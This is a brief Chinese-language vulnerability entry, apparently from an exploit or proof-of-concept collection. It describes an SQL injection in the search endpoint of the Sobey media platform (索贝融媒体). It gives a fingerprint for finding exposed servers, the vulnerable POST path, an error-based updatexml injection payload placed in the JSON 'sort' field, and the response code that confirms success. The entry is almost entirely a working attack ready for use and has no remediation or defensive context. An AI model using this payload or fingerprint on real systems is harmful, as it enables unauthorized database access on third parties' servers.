# 索贝融媒体search存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`body="/Sc-TaskMonitoring/"`
- **请求**：`POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1`

**Payload**
```
{"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 and(updatexml(1,concat(0x7e,(select md5(123456))),1))","desc":true}}
```
- **响应特征**：500